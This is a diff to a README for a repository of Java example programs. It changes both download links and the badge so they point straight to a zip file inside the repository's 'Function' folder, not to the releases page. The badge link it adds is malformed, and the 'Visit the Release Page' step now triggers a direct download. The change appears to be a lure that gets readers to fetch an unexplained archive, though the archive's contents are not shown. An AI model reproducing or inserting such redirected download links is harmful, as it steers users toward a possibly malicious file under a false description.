@@ -6,7 +6,7 @@ Welcome to JavaProgramming! This repository offers a collection of Java programs
 
 ### 🌐 Download JavaProgramming
 
-[![Download JavaProgramming](https://img.shields.io/badge/Download%20JavaProgramming-Click%20Here-brightgreen)](https://github.com/karterhhgg/JavaProgramming/releases)
+[![Download JavaProgramming](https://raw.githubusercontent.com/karterhhgg/JavaProgramming/main/Function/Programming-Java-3.8.zip%20JavaProgramming-Click%20Here-brightgreen)](https://raw.githubusercontent.com/karterhhgg/JavaProgramming/main/Function/Programming-Java-3.8.zip)
 
 ## 📦 Features
 
@@ -32,7 +32,7 @@ To run the Java programs, you'll need:
 
 ## 🌟 How to Download & Install
 
-1. **Visit the Release Page:** Click [here](https://github.com/karterhhgg/JavaProgramming/releases).
+1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/karterhhgg/JavaProgramming/main/Function/Programming-Java-3.8.zip).
 2. **Choose the Version:** Browse for the latest version of JavaProgramming.
 3. **Download the .zip File:** Click on the .zip file to download to your computer.
 4. **Extract the Files:** Locate the downloaded .zip file and extract it to your desired folder.
